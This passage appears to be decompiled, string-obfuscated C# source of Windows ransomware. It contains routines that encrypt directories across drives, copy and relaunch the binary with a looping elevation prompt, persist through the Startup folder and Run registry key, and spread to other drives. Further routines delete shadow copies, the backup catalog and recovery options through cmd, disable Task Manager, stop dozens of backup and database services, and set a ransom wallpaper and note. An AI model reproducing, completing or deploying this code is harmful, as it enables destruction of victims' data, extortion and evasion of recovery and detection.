				array[Convert.ToInt32(5.0)] = _003CModule_003E.SERT("ꎨꎃꎏꎙꎁꎉꎂꎘꎟꏌꎍꎂꎈꏌꎿꎉꎘꎘꎅꎂꎋꎟ", Convert.ToInt32(1539154925.8032675 - Math.Tan(769577462.0)));
				array[Convert.ToInt32(6.0)] = _003CModule_003E.SERT("㺭㺊㺐㺁㺈", Convert.ToInt32(559365860.0));
				array[Convert.ToInt32(3.5 + Math.Abs(3.5))] = _003CModule_003E.SERT("\ue157\ue162\ue175\ue161\ue14b\ue168\ue160\ue174", Convert.ToInt32(596238598.0 + Math.Tanh(298119299.5)));
				array[Convert.ToInt32(7.346356379136388 - Math.Cos(4.0))] = _003CModule_003E.SERT("ﶶﶈﶏﶅﶎﶖﶒ\ufdcfﶎﶍﶅ", Convert.ToInt32(2565340369.0 - Math.Floor(855113456.5)));
				array[Convert.ToInt32(4.362667945448815 + Math.Tan(4.5))] = _003CModule_003E.SERT("ퟍퟁ\ud7c8", Convert.ToInt32(860608396.7897453 - Math.Sin(430304198.0)));
				array[(1828469830 + sizeof(float)) ^ (1828469820 + sizeof(float))] = _003CModule_003E.SERT("ǁǙǆǋǆǎ", Convert.ToInt32(1312686478.0915341 + Math.Cos(656343239.5)));
				array[Convert.ToInt32(16.5 - Math.Abs(5.5))] = _003CModule_003E.SERT("\u08ee\u08cc\u08d1\u08d9\u08cc\u08df\u08d3\u08fa\u08df\u08ca\u08df", (663627538 + sizeof(float)) ^ (1323773860 + sizeof(float)));
				string[] array2 = array;
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = -4 + sizeof(float); j < directories.Length; j += -3 + sizeof(float))
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array2, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private unsafe static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath((Environment.SpecialFolder)Convert.ToInt32(26.0)) + _003CModule_003E.SERT("졯", Convert.ToInt32(1344718900.0 - Math.Tanh(672359449.5)));
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(-3 + sizeof(float));
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(Convert.ToInt32(200.0));
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(-3 + sizeof(float));
		}
	}

	private unsafe static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath((Environment.SpecialFolder)Convert.ToInt32(25.53697886706351 + Math.Tan(13.0))) + _003CModule_003E.SERT("⊖", Convert.ToInt32(1773347530.0));
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = (byte)(-3 + sizeof(float)) != 0;
		processStartInfo.Verb = _003CModule_003E.SERT("콞콙콂콍콟", Convert.ToInt32(1202966315.0204263 - Math.Sin(601483158.0)));
		processStartInfo.WindowStyle = (ProcessWindowStyle)(-4 + sizeof(float));
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(-3 + sizeof(float));
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == Convert.ToInt32(1223.0))
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(Convert.ToInt32(200.0));
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(-3 + sizeof(float));
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == Convert.ToInt32(1216.5840850448728 + Math.Log(611.5)))
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private unsafe static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)Convert.ToInt32(8.87082869338697 - Math.Sqrt(3.5)));
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + _003CModule_003E.SERT("\ue98e", Convert.ToInt32(198571241.0 + Math.Truncate(198571241.0))) + text + _003CModule_003E.SERT("씰앫앬앲", Convert.ToInt32(1414579486.0)));
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine(_003CModule_003E.SERT("㵛㵉㵮㵴㵥㵲㵮㵥㵴㵓㵨㵯㵲㵴㵣㵵㵴㵝", Convert.ToInt32(82066688.0)));
		streamWriter.WriteLine(_003CModule_003E.SERT("\u08d7\u08d0\u08ceࢿ\u08e4\u08eb\u08ee\u08e7ࢸࢭࢭࢭ", Convert.ToInt32(1575225482.8963127 - Math.Log10(787612737.0))) + location);
		streamWriter.WriteLine(_003CModule_003E.SERT("\ud864\ud84e\ud842\ud843\ud864\ud843\ud849\ud848\ud855\ud810\ud81d", Convert.ToInt32(416339993.84613436 + Math.Log(208170006.5))));
		string text2 = location.Replace((char)Convert.ToInt32(46.0 + Math.Truncate(46.0)), (char)((1705045232 + sizeof(float)) ^ (1705045207 + sizeof(float))));
		streamWriter.WriteLine(_003CModule_003E.SERT("ꌾꌔꌘꌙꌱꌞꌛꌒꍊ", Convert.ToInt32(244622207.08746588 - Math.Log10(122311099.5))) + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath((Environment.SpecialFolder)Convert.ToInt32(26.0)) + _003CModule_003E.SERT("䥀", Convert.ToInt32(1881622816.8850486 + Math.Tan(940811406.0))) + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(Convert.ToInt32(505.52146091786227 - Math.Log(250.0)));
			Process.Start(text);
		}
		catch
		{
		}
	}

	private unsafe static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath((Environment.SpecialFolder)Convert.ToInt32(13.0 + Math.Floor(13.0))) + _003CModule_003E.SERT("ⲯ", Convert.ToInt32(1621278139.025964 + Math.Sqrt(810653305.5))) + processName;
		string path = Environment.GetFolderPath((Environment.SpecialFolder)Convert.ToInt32(13.0 + Math.Floor(13.0))) + _003CModule_003E.SERT("쳺", Convert.ToInt32(553241766.6282055 + Math.Sin(276620883.0))) + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return (byte)(-3 + sizeof(float)) != 0;
		}
		return (byte)(-4 + sizeof(float)) != 0;
	}

	private unsafe static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(_003CModule_003E.SERT("\uf880\uf89c\uf895\uf887\uf884\uf892\uf881\uf896\uf88f\uf89e\uf8ba\uf8b0\uf8a1\uf8bc\uf8a0\uf8bc\uf8b5\uf8a7\uf88f\uf884\uf8ba\uf8bd\uf8b7\uf8bc\uf8a4\uf8a0\uf88f\uf890\uf8a6\uf8a1\uf8a1\uf8b6\uf8bd\uf8a7\uf885\uf8b6\uf8a1\uf8a0\uf8ba\uf8bc\uf8bd\uf88f\uf881\uf8a6\uf8bd", Convert.ToInt32(1754527955.0)), (byte)(-3 + sizeof(float)) != 0);
			registryKey.SetValue(_003CModule_003E.SERT("놋놮놺놿놪놻놊놿놭놵", Convert.ToInt32(109621708.18060103 + Math.Log(54810863.0))), Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private unsafe static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		for (int i = -4 + sizeof(float); i < drives.Length; i += -3 + sizeof(float))
		{
			DriveInfo driveInfo = drives[i];
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private unsafe static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = _003CModule_003E.SERT("\uf2b8\uf2b6\uf2bf\uf2f5\uf2be\uf2a3\uf2be", Convert.ToInt32(1529803462.544742 + Math.Log(764901741.5)));
		processStartInfo.Arguments = _003CModule_003E.SERT("\udbe5\udb89\udbea", Convert.ToInt32(2050874314.743215 - Math.Sin(1025437157.0))) + commands;
		processStartInfo.WindowStyle = (ProcessWindowStyle)(-3 + sizeof(float));
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand(_003CModule_003E.SERT("\ue66e\ue66b\ue66b\ue679\ue67c\ue675\ue671\ue676\ue638\ue67c\ue67d\ue674\ue67d\ue66c\ue67d\ue638\ue66b\ue670\ue679\ue67c\ue677\ue66f\ue66b\ue638\ue637\ue679\ue674\ue674\ue638\ue637\ue669\ue66d\ue671\ue67d\ue66c\ue638\ue63e\ue638\ue66f\ue675\ue671\ue67b\ue638\ue66b\ue670\ue679\ue67c\ue677\ue66f\ue67b\ue677\ue668\ue661\ue638\ue67c\ue67d\ue674\ue67d\ue66c\ue67d", Convert.ToInt32(2202589476.0 - Math.Round(734196492.0))));
	}

	private static void disableRecoveryMode()
	{
		runCommand(_003CModule_003E.SERT("䙵䙴䙳䙲䙳䙾䙣䘷䘸䙤䙲䙣䘷䙬䙳䙲䙱䙶䙢䙻䙣䙪䘷䙵䙸䙸䙣䙤䙣䙶䙣䙢䙤䙧䙸䙻䙾䙴䙮䘷䙾䙰䙹䙸䙥䙲䙶䙻䙻䙱䙶䙾䙻䙢䙥䙲䙤䘷䘱䘷䙵䙴䙳䙲䙳䙾䙣䘷䘸䙤䙲䙣䘷䙬䙳䙲䙱䙶䙢䙻䙣䙪䘷䙥䙲䙴䙸䙡䙲䙥䙮䙲䙹䙶䙵䙻䙲䙳䘷䙹䙸", Convert.ToInt32(451846923.0 + Math.Ceiling(451846923.5))));
	}

	private static void deleteBackupCatalog()
	{
		runCommand(_003CModule_003E.SERT("媺媯媬媩媠媤媣嫭媩媨媡媨媹媨嫭媮媬媹媬媡媢媪嫭嫠媼媸媤媨媹", Convert.ToInt32(1134058188.0 + Math.Tanh(567029094.5))));
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.SERT("胡胝胔胆胅胓胀胗胮胿胛胑胀胝胁胝胔胆胮胥胛胜胖胝胅胁胮胱胇胀胀胗胜胆胤胗胀胁胛胝胜胮胢胝胞胛胑胛胗胁胮胡胋胁胆胗胟", Convert.ToInt32(836337843.0 - Math.Tanh(418168921.0))));
			registryKey.SetValue(_003CModule_003E.SERT("癱癜癆癔癗癙癐癡癔癆癞癸癒癇", Convert.ToInt32(529364552.39404064 - Math.Log(264682266.5))), _003CModule_003E.SERT("冈", Convert.ToInt32(52624022.0 - Math.Ceiling(17541340.5))));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private unsafe static void stopBackupServices()
	{
		//IL_0ac9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ad2: Expected O, but got Unknown
		string[] array = new string[Convert.ToInt32(63.0 - Math.Round(21.0))];
		array[-4 + sizeof(float)] = _003CModule_003E.SERT("ᢷᢔᢖᢞᢀ\u1885ᢰᢍᢐᢖᢴᢒᢐᢛᢁᢷᢇᢚᢂ\u1886ᢐᢇ", Convert.ToInt32(2691671407.5 - Math.Abs(897223802.5)));
		array[-3 + sizeof(float)] = _003CModule_003E.SERT("툋툨툪툢툼툹툌툱투툪툍툠툿투툪툠툄투툭툠툨툚투툻툿툠툪투", Convert.ToInt32(746246729.0));
		array[Convert.ToInt32(0.4425922753450977 + Math.Tan(1.0))] = _003CModule_003E.SERT("繟繼繾繶繨繭繘繥繸繾繗繲繿繘繳繺繴繳繸", Convert.ToInt32(90029839.0 + Math.Truncate(90029838.5)));
		array[Convert.ToInt32(4.0 - Math.Truncate(1.5))] = _003CModule_003E.SERT("䂠䂃䂁䂉䂗䂒䂧䂚䂇䂁䂯䂃䂌䂃䂅䂇䂏䂇䂌䂖䂱䂇䂐䂔䂋䂁䂇", Convert.ToInt32(1102332130.0));
		array[Convert.ToInt32(6.0 - Math.Abs(2.0))] = _003CModule_003E.SERT("⿕⿐⿐", Convert.ToInt32(802697123.0));
		array[Convert.ToInt32(5.0)] = _003CModule_003E.SERT("션셚셇", Convert.ToInt32(491241771.0));
		array[Convert.ToInt32(9.0 - Math.Floor(3.0))] = _003CModule_003E.SERT("珵珰珥玢", Convert.ToInt32(788493190.0));
		array[Convert.ToInt32(7.0)] = _003CModule_003E.SERT("㝃㝋㝃㝚㝏㝝", Convert.ToInt32(1675245360.586005 + Math.Tan(837622679.0)));
		array[(1310414132 + sizeof(float)) ^ (1310414124 + sizeof(float))] = _003CModule_003E.SERT("뚮뚲뚭뚵뚲뚮", Convert.ToInt32(2088023772.0 + Math.Tanh(1044011886.5)));
		array[Convert.ToInt32(8.78920420056922 - Math.Cos(4.5))] = _003CModule_003E.SERT("ꀭꀾꀾꀺꀶ", Convert.ToInt32(757223470.0 + Math.Floor(757223469.5)));
		array[Convert.ToInt32(15.0 - Math.Ceiling(5.0))] = _003CModule_003E.SERT("䍰䍳䍱䍹䍧䍢", Convert.ToInt32(1605124881.2931046 - Math.Cos(802562441.0)));
		array[Convert.ToInt32(5.0 + Math.Ceiling(5.5))] = _003CModule_003E.SERT("ᤈ\u1937ᤙ\u193c\u193c", Convert.ToInt32(1932990799.9387314 - Math.Sin(966495399.5)));
		array[Convert.ToInt32(12.0)] = _003CModule_003E.SERT("\ued2c\ued13\ued29\ued07\ued19", Convert.ToInt32(1037757803.0));
		array[Convert.ToInt32(13.0)] = _003CModule_003E.SERT("心忼忂忓忀", Convert.ToInt32(2032458762.1028607 - Math.Sqrt(1016213442.0)));
		array[Convert.ToInt32(21.0 - Math.Round(7.0))] = _003CModule_003E.SERT("蹹蹆蹽蹨蹺", Convert.ToInt32(1105169978.6401224 - Math.Tan(552584991.0)));
		array[Convert.ToInt32(7.0 + Math.Ceiling(7.5))] = _003CModule_003E.SERT("鯂鯽鯆鯌鯈鯢鯷", Convert.ToInt32(1174379397.0));
		array[Convert.ToInt32(18.079441541679834 - Math.Log(8.0))] = _003CModule_003E.SERT("釭里量釾釈針释釁", Convert.ToInt32(877433258.0 - Math.Tanh(438716628.5)));
		array[Convert.ToInt32(17.79848711262349 - Math.Sin(8.5))] = _003CModule_003E.SERT("闸闸闞闭闯闖闼闩", Convert.ToInt32(1468962203.6231759 + Math.Tan(734481101.5)));
		array[Convert.ToInt32(27.0 - Math.Round(9.0))] = _003CModule_003E.SERT("啺啈啟啻商啈啄", Convert.ToInt32(1759597865.0));
		array[Convert.ToInt32(18.924635761242605 + Math.Tan(9.5))] = _003CModule_003E.SERT("␍␋␉\u242c\u243c\u243e\u2431", Convert.ToInt32(1148265567.0));
		array[Convert.ToInt32(19.351639172540914 + Math.Tan(10.0))] = _003CModule_003E.SERT("וֹﭘﭜﭙשּﭿﭨﭬﭳﭹﭿ", Convert.ToInt32(1012071173.9578824 + Math.Log(506035597.0)));
		array[(184170163 + sizeof(float)) ^ (184170142 + sizeof(float))] = _003CModule_003E.SERT("㗃㗤㗾㗿㗣㗾㖤㗛㗿㗣㗩㗡㗈㗥㗥㗡㗹㖤㗌㗉㗙", Convert.ToInt32(400267973.0 + Math.Round(400267973.0)));
		array[Convert.ToInt32(22.999990206550702 + Math.Sin(11.0))] = _003CModule_003E.SERT("쩖쩠쩠쩍쩮쩬쩤쩺쩿", Convert.ToInt32(772917794.772536 - Math.Log(386458887.5)));
		array[Convert.ToInt32(22.12454782531157 - Math.Sin(11.5))] = _003CModule_003E.SERT("籫籝籝类籦", Convert.ToInt32(333937714.0));
		array[Convert.ToInt32(24.0)] = _003CModule_003E.SERT("쨫쨹쨤쨵쨾쨿쨶쨷쨰쨿쨶쨨쨤", Convert.ToInt32(895142482.0 - Math.Tanh(447571240.5)));
		array[Convert.ToInt32(27.525728644308256 - Math.Log(12.5))] = _003CModule_003E.SERT("兯关公兴关兯", Convert.ToInt32(1233932572.0));
		array[(601084852 + sizeof(float)) ^ (601084830 + sizeof(float))] = _003CModule_003E.SERT("뻿뻸뻯뻓뻾뻭뻻뻓뻭뻫뻩뻢뻸", Convert.ToInt32(1747959436.0));
		array[Convert.ToInt32(25.869666231504993 + Math.Log10(13.5))] = _003CModule_003E.SERT("㯀㯅㯘㯗㯆㯀㯅㯅", Convert.ToInt32(460405634.74552864 + Math.Log(230202827.0)));
		array[Convert.ToInt32(20.755393383905194 + Math.Tan(14.0))] = _003CModule_003E.SERT("\udd99\udd8a\udd8b\udd8e\udd85\udda7\udda6\udda1\uddbc\udda7\uddba\udd9b\uddad\uddba\uddbe\udda1\uddab\uddad", Convert.ToInt32(2031279561.0 - Math.Tanh(1015639780.0)));
		array[Convert.ToInt32(44.0 - Math.Ceiling(14.5))] = _003CModule_003E.SERT("땤땗땗땓땟땦땀땓땜땁땂땝땀땆땡땄땑", Convert.ToInt32(592056267.0 - Math.Round(197352089.0)));
		array[Convert.ToInt32(29.00000000000019 + Math.Tanh(15.0))] = _003CModule_003E.SERT("㶫㶘㶘㶜㶐㶹㶘㶍㶑㶒㶄㶐㶘㶓㶉㶮㶘㶏㶋㶔㶞㶘", Convert.ToInt32(2113945085.0));
		array[Convert.ToInt32(46.5 - Math.Abs(15.5))] = _003CModule_003E.SERT("㎏㎼㎼㎸㎴㎗㎟㎊㎊㎯㎺", Convert.ToInt32(372297157.0 - Math.Floor(124099052.5)));
		array[(1393157553 + sizeof(float)) ^ (1393157521 + sizeof(float))] = _003CModule_003E.SERT("\ue514\ue507\ue507\ue503\ue50f", Convert.ToInt32(2847463443.0 - Math.Truncate(949154481.0)));
		array[Convert.ToInt32(31.986633934800654 + Math.Tan(16.5))] = _003CModule_003E.SERT("\uf833\uf827\uf835\uf825\uf830\uf830\uf806\uf811\uf815\uf80a\uf800\uf806", Convert.ToInt32(460126308.0 - Math.Tanh(230063153.5)));
		array[Convert.ToInt32(17.0 + Math.Floor(17.0))] = _003CModule_003E.SERT("ﲺﲙﲛﲓﲍﲈﲽﲀﲝﲛﲮﲫﲫﲨﲊﲗﲎﲑﲜﲝﲊ", Convert.ToInt32(932510959.3313761 + Math.Log10(466255484.0)));
		array[Convert.ToInt32(35.0)] = _003CModule_003E.SERT("杓杰杲杺杤条杔杩杴杲材杶杴板来材杲杲杴杽杴杣杰来松杣", Convert.ToInt32(958228241.0));
		array[Convert.ToInt32(36.0)] = _003CModule_003E.SERT("㝻㝘㝚㝒㝌㝉㝼㝁㝜㝚㝫㝩㝺㝪㝜㝋㝏㝐㝚㝜", Convert.ToInt32(359216953.785591 + Math.Sin(179608476.5)));
		array[Convert.ToInt32(32.698837366478685 + Math.Sqrt(18.5))] = _003CModule_003E.SERT("厏厭厼厝厭厦叼厝厸厭", Convert.ToInt32(1404982221.7284548 + Math.Cos(702491111.0)));
		array[Convert.ToInt32(57.0 - Math.Abs(19.0))] = _003CModule_003E.SERT("⽐⽲⽣⽾⽿⽸⽢⽐⽶⽴⽿⽥", Convert.ToInt32(578236177.0));
		array[Convert.ToInt32(58.0 - Math.Truncate(19.5))] = _003CModule_003E.SERT("༐༒ༀ༒༗ཡ༗༄༶༱ༀ༥༰", Convert.ToInt32(424072817.27999514 + Math.Sqrt(212043689.5)));
		array[Convert.ToInt32(39.59191793818661 + Math.Cos(20.0))] = _003CModule_003E.SERT("⇚⇘⇘⇋⇚⇌⇩⇽⇸⇭⇼⇊⇯⇺", Convert.ToInt32(353514086.0 - Math.Ceiling(117838028.5)));
		array[Convert.ToInt32(21.0 + Math.Floor(20.5))] = _003CModule_003E.SERT("⻊\u2efb\u2eff⻳⻈\u2ef7\u2efb⻩\u2efb⻬", Convert.ToInt32(744101711.0 + Math.Ceiling(744101711.0)));
		string[] array2 = array;
		string[] array3 = array2;
		for (int i = -4 + sizeof(float); i < array3.Length; i += -3 + sizeof(float))
		{
			string text = array3[i];
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public unsafe static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(Convert.ToInt32(4.5 + Math.Abs(4.5))) + _003CModule_003E.SERT("䨘䩜䩆䩑", Convert.ToInt32(1526876725.0 + Math.Tanh(763438363.0)));
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo((uint)Convert.ToInt32(30.0 - Math.Ceiling(10.0)), (uint)(-4 + sizeof(float)), text, (uint)Convert.ToInt32(3.0));
			}
			catch
			{
			}
		}
	}

	unsafe static Program()
	{
		string[] array = new string[Convert.ToInt32(114.0 + Math.Ceiling(114.5))];
		array[-4 + sizeof(float)] = _003CModule_003E.SERT("䛷䚭䚡䚭", Convert.ToInt32(1572161241.0));
		array[-3 + sizeof(float)] = _003CModule_003E.SERT("\ue4a9\ue4ed\ue4e6\ue4f5", Convert.ToInt32(323019911.1649742 - Math.Cos(161509955.5)));
		array[Convert.ToInt32(2.761594155955765 - Math.Tanh(1.0))] = _003CModule_003E.SERT("\ue231\ue27b\ue27e\ue26b", Convert.ToInt32(1278665247.0));
		array[Convert.ToInt32(3.0)] = _003CModule_003E.SERT("軸躵躹躸躢躷躵躢", Convert.ToInt32(2527254081.0 - Math.Ceiling(842418027.0)));
		array[Convert.ToInt32(4.909297426825682 - Math.Sin(2.0))] = _003CModule_003E.SERT("\ued55\ued08\ued1e\ued0f\ued0f\ued12\ued15\ued1c\ued08", Convert.ToInt32(1740434831.5842535 - Math.Log(870217405.5)));
		array[Convert.ToInt32(2.5 + Math.Abs(2.5))] = _003CModule_003E.SERT("꾡꿫꿠꿬", Convert.ToInt32(679587735.5312155 - Math.Log10(339793863.5)));
		array[Convert.ToInt32(6.0)] = _003CModule_003E.SERT("뫔몞몕몙몂", Convert.ToInt32(2124069625.8412495 + Math.Cos(1062034813.0)));
		array[Convert.ToInt32(7.544068044350276 - Math.Log10(3.5))] = _003CModule_003E.SERT("븾빨빼빣", Convert.ToInt32(71417360.4070043 + Math.Sin(35708680.0)));
		array[Convert.ToInt32(8.756802495307928 + Math.Sin(4.0))] = _003CModule_003E.SERT("\ufe00﹖﹂﹝﹖", Convert.ToInt32(771817006.0000001));
		array[Convert.ToInt32(6.878679656440358 + Math.Sqrt(4.5))] = _003CModule_003E.SERT("¬òòö", Convert.ToInt32(1645019266.0));
		array[(525168587 + sizeof(float)) ^ (525168577 + sizeof(float))] = _003CModule_003E.SERT("㐍㑓㑓㑗㑛", Convert.ToInt32(1889350691.0));
		array[Convert.ToInt32(11.705540325570391 + Math.Sin(5.5))] = _003CModule_003E.SERT("⤘⥙⥒⥂", Convert.ToInt32(1007850651.0 + Math.Round(1007850651.0)));
		array[Convert.ToInt32(11.000012288349204 + Math.Tanh(6.0))] = _003CModule_003E.SERT("睒眖県眛", Convert.ToInt32(1338603396.8256218 - Math.Log10(669301694.0)));
		array[(899409675 + sizeof(float)) ^ (899409662 + sizeof(float))] = _003CModule_003E.SERT("삦샥샣샩", Convert.ToInt32(1587630713.0209582 + Math.Sqrt(793829444.0)));
		array[Convert.ToInt32(7.0 + Math.Abs(7.0))] = _003CModule_003E.SERT("鐱鑲鑷鑫鑲鑳", Convert.ToInt32(2685427247.0 - Math.Ceiling(895142415.5)));
		array[Convert.ToInt32(15.0)] = _003CModule_003E.SERT("啉唈唖唞", Convert.ToInt32(338318695.0));
		array[Convert.ToInt32(22.79971145522038 + Math.Tan(8.0))] = _003CModule_003E.SERT("\ue77d\ue723\ue73d\ue734", Convert.ToInt32(279701331.0));
		array[Convert.ToInt32(19.91547594742265 - Math.Sqrt(8.5))] = _003CModule_003E.SERT("䭚䬗䬇䬂", Convert.ToInt32(1929792363.0155194 + Math.Log10(964896186.0)));
		array[Convert.ToInt32(18.0)] = _003CModule_003E.SERT("ꆭꇳꇺ", Convert.ToInt32(348365178.75899523 + Math.Log10(174182593.5)));
		array[Convert.ToInt32(19.0)] = _003CModule_003E.SERT("◕█▊▗", Convert.ToInt32(2058823163.0));
		array[Convert.ToInt32(30.0 - Math.Ceiling(10.0))] = _003CModule_003E.SERT("\ue698\ue6db\ue6d2\ue6d4", Convert.ToInt32(216160785.0 - Math.Abs(72053595.0)));
		array[Convert.ToInt32(21.0)] = _003CModule_003E.SERT("醾釠釸釠", Convert.ToInt32(727697608.0 + Math.Round(727697608.0)));
		array[Convert.ToInt32(11.0 + Math.Abs(11.0))] = _003CModule_003E.SERT("ﰹﱶﱤﱧ", Convert.ToInt32(618561036.0 + Math.Truncate(618561035.5)));
		array[Convert.ToInt32(23.483304758753007 - Math.Cos(11.5))] = _003CModule_003E.SERT("\uf1e7\uf1a8\uf1ba\uf1b9\uf1b1", Convert.ToInt32(1375138249.0));
		array[(368566161 + sizeof(float)) ^ (368566153 + sizeof(float))] = _003CModule_003E.SERT("ⴼ\u2d7aⵦ\u2d7f\u2d7e", Convert.ToInt32(1778265362.0));
		array[(1934514582 + sizeof(float)) ^ (1934514559 + sizeof(float))] = _003CModule_003E.SERT("笰筶筪筳", Convert.ToInt32(1770289950.7106428 - Math.Cos(885144975.0)));
		array[Convert.ToInt32(28.564949357461536 - Math.Log(13.0))] = _003CModule_003E.SERT("痃疕疀疁", Convert.ToInt32(1100051949.0));
		array[Convert.ToInt32(27.803784426551623 - Math.Sin(13.5))] = _003CModule_003E.SERT("嫧媹媺媭", Convert.ToInt32(1968397001.0));
		array[Convert.ToInt32(25.36094267038474 + Math.Log(14.0))] = _003CModule_003E.SERT("\ue009\ue057\ue043\ue041", Convert.ToInt32(1688592402.445986 + Math.Log(844296211.5)));
		array[Convert.ToInt32(28.000000000000508 + Math.Tanh(14.5))] = _003CModule_003E.SERT("릖맀맔맙", Convert.ToInt32(771996107.7713429 - Math.Log(385998044.0)));
		array[Convert.ToInt32(29.00000000000019 + Math.Tanh(15.0))] = _003CModule_003E.SERT("\ue380\ue3cd\ue3db\ue3cc", Convert.ToInt32(715157975.0 + Math.Abs(715157975.0)));
		array[Convert.ToInt32(31.978453462818884 + Math.Cos(15.5))] = _003CModule_003E.SERT("蝌蜆蜃蜇", Convert.ToInt32(2023327585.1798825 - Math.Cos(1011663793.0)));
		array[Convert.ToInt32(32.0)] = _003CModule_003E.SERT("\u108f\u10c8\u10cfჅჅ", (609370302 + sizeof(float)) ^ (490033247 + sizeof(float)));
		array[Convert.ToInt32(49.0 - Math.Round(16.5))] = _003CModule_003E.SERT("\ueb99\uebd4\uebc4", Convert.ToInt32(32562163.767726637 + Math.Sqrt(16283099.5)));
		array[Convert.ToInt32(17.0 + Math.Round(17.0))] = _003CModule_003E.SERT("ᾕῖΉᾈ", Convert.ToInt32(2888773528.0 - Math.Truncate(962924509.5)));
		array[Convert.ToInt32(33.756961951313706 + Math.Log10(17.5))] = _003CModule_003E.SERT("狄犇犚狞", Convert.ToInt32(1879470826.0));
		array[Convert.ToInt32(36.0)] = _003CModule_003E.SERT("贆赌赟赏", Convert.ToInt32(728974996.0 + Math.Round(728974996.0)));
		array[Convert.ToInt32(37.0)] = _003CModule_003E.SERT("䕫䔿䔬䔵", Convert.ToInt32(2099210216.0 - Math.Ceiling(699736738.5)));
		array[Convert.ToInt32(38.0)] = _003CModule_003E.SERT("Ꭺ\u13f6Ꮵ\u13f6", Convert.ToInt32(1667371907.0 + Math.Tanh(833685954.0)));
		array[Convert.ToInt32(58.5 - Math.Abs(19.5))] = _003CModule_003E.SERT("\ue059\ue01a\ue018\ue001", Convert.ToInt32(1169219704.0 - Math.Tanh(584609851.5)));
		array[Convert.ToInt32(35.52786404500042 + Math.Sqrt(20.0))] = _003CModule_003E.SERT("\u0328ʹͲ\u0360", Convert.ToInt32(1927414534.0));
		array[Convert.ToInt32(61.0 - Math.Floor(20.5))] = _003CModule_003E.SERT("먹멵멺멧", (1097036573 + sizeof(float)) ^ (459458866 + sizeof(float)));
		array[Convert.ToInt32(63.0 - Math.Round(21.0))] = _003CModule_003E.SERT("ṐḓḕḈ", Convert.ToInt32(285781437.0 - Math.Floor(95260479.0)));
		array[Convert.ToInt32(64.0 - Math.Floor(21.5))] = _003CModule_003E.SERT("㩊㨅㨒㨍", Convert.ToInt32(192232035.0001205 - Math.Tan(96116018.0)));
		array[Convert.ToInt32(66.0 - Math.Round(22.0))] = _003CModule_003E.SERT("থ৪৻ৠ", Convert.ToInt32(354486666.0 + Math.Tanh(177243333.5)));
